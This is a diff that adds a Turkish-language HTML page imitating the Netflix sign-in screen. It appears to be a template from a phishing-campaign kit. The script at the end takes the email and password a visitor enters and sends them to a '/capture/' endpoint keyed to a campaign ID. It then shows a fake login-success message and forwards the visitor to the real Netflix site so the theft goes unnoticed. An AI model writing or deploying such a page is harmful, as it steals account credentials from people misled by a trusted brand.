@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Türkiye - İzle TV Programlarını ve Filmleri Çevrimiçi İzle</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #141414;
+            color: white;
+            background-image: linear-gradient(to bottom, rgba(0, 0, 0, 0.8) 0%, rgba(0, 0, 0, 0.4) 60%, rgba(0, 0, 0, 0.8) 100%), url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88b/387c4711-a627-4231-9b70-8fad8758c91b/TR-tr-20240311-popsignuptwoweeks-perspective_alpha_website_large.jpg');
+            background-size: cover;
+            background-position: center;
+            min-height: 100vh;
+        }
+
+        .navbar {
+            padding: 20px 60px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            color: #e50914;
+            font-size: 36px;
+            font-weight: bold;
+            text-decoration: none;
+            font-family: 'Bebas Neue', cursive;
+        }
+
+        .signin-btn {
+            background-color: #e50914;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 16px;
+        }
+
+        .signin-btn:hover {
+            background-color: #f40612;
+        }
+
+        .hero {
+            text-align: center;
+            padding: 75px 20px;
+            max-width: 950px;
+            margin: 0 auto;
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            line-height: 1.1;
+        }
+
+        .hero h2 {
+            font-size: 26px;
+            font-weight: 400;
+            margin-bottom: 30px;
+        }
+
+        .hero h3 {
+            font-size: 19px;
+            font-weight: 400;
+            margin-bottom: 20px;
+        }
+
+        .email-form {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .email-input {
+            flex: 1;
+            max-width: 500px;
+            padding: 24px 16px;
+            font-size: 16px;
+            border: 1px solid #8c8c8c;
+            border-radius: 2px;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+        }
+
+        .email-input:focus {
+            outline: none;
+            border-color: white;
+        }
+
+        .get-started {
+            background-color: #e50914;
+            color: white;
+            border: none;
+            padding: 0 26px;
+            font-size: 26px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            border-radius: 2px;
+        }
+
+        .get-started:hover {
+            background-color: #f40612;
+        }
+
+        .get-started i {
+            margin-left: 10px;
+        }
+
+        .login-container {
+            background-color: rgba(0, 0, 0, 0.75);
+            max-width: 450px;
+            margin: 50px auto;
+            padding: 60px 68px 40px;
+            border-radius: 4px;
+        }
+
+        .login-container h1 {
+            font-size: 32px;
+            margin-bottom: 28px;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 0;
+            border-radius: 4px;
+            background-color: #333;
+            color: white;
+            font-size: 16px;
+        }
+
+        .login-form input:focus {
+            outline: none;
+            background-color: #454545;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #e50914;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 24px 0 12px;
+            cursor: pointer;
+        }
+
+        .login-btn:hover {
+            background-color: #f40612;
+        }
+
+        .help-section {
+            display: flex;
+            justify-content: space-between;
+            color: #b3b3b3;
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+        }
+
+        .remember-me input {
+            margin-right: 5px;
+        }
+
+        .need-help {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+
+        .need-help:hover {
+            text-decoration: underline;
+        }
+
+        .signup-now {
+            color: #737373;
+            font-size: 16px;
+            margin-top: 16px;
+        }
+
+        .signup-now a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .signup-now a:hover {
+            text-decoration: underline;
+        }
+
+        .learn-more {
+            color: #737373;
+            font-size: 13px;
+            margin-top: 11px;
+        }
+
+        .learn-more a {
+            color: #0071eb;
+            text-decoration: none;
+        }
+
+        .learn-more a:hover {
+            text-decoration: underline;
+        }
+
+        .loading {
+            display: none;
+            margin: 10px auto;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #333;
+            border-top: 3px solid #e50914;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 740px) {
+            .login-container {
+                padding: 40px 20px;
+            }
+
+            .navbar {
+                padding: 20px;
+            }
+
+            .hero h1 {
+                font-size: 28px;
+            }
+
+            .hero h2 {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div class="logo">NETFLIX</div>
+        <a href="#" class="signin-btn">Oturum Aç</a>
+    </div>
+
+    <div class="hero">
+        <h1>Sınırsız film, dizi ve çok daha fazlası.</h1>
+        <h2>İstediğiniz yerde izleyin. İstediğiniz zaman iptal edin.</h2>
+        <h3>İzlemeye hazır mısınız? Üyelik oluşturmak veya üyeliğinize erişmek için e‑posta adresinizi girin.</h3>
+
+        <div class="email-form">
+            <input type="email" class="email-input" placeholder="E-posta adresi">
+            <button class="get-started">
+                Başlayın <i class="fas fa-chevron-right"></i>
+            </button>
+        </div>
+    </div>
+
+    <div class="login-container" id="login-form-container" style="display: none;">
+        <h1>Oturum Aç</h1>
+        <form id="login-form">
+            <input type="email" id="email" placeholder="E-posta adresi veya telefon numarası" required>
+            <input type="password" id="password" placeholder="Şifre" required>
+
+            <button type="submit" class="login-btn">Oturum Aç</button>
+            <div class="loading" id="loading"></div>
+
+            <div class="help-section">
+                <div class="remember-me">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Beni Hatırla</label>
+                </div>
+                <a href="#" class="need-help">Yardım ister misiniz?</a>
+            </div>
+
+            <div class="signup-now">
+                Netflix'e katılmak ister misiniz? <a href="#">Şimdi kaydolun.</a>
+            </div>
+
+            <div class="learn-more">
+                Bu sayfa robot olmadığınızı kanıtlamak için Google reCAPTCHA tarafından korunuyor.
+                <a href="#">Daha fazlasını öğrenin.</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const campaignId = window.location.pathname.substring(1);
+
+        // Show login form when signin button clicked
+        document.querySelector('.signin-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('login-form-container').style.display = 'block';
+            window.scrollTo(0, 0);
+        });
+
+        // Login form submission
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert('Lütfen e-posta ve şifre girin!');
+                return;
+            }
+
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                const response = await fetch(`/capture/${campaignId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        platform: 'Netflix'
+                    })
+                });
+
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    alert('Giriş başarılı! Yönlendiriliyorsunuz...');
+
+                    setTimeout(() => {
+                        window.location.href = 'https://www.netflix.com/';
+                    }, 1000);
+                }, 2000);
+
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+            }
+        });
+
+        // Get started button
+        document.querySelector('.get-started').addEventListener('click', function() {
+            alert('Üyelik oluşturma özelliği şu anda kullanılamıyor.');
+        });
+    </script>
+</body>
+</html>
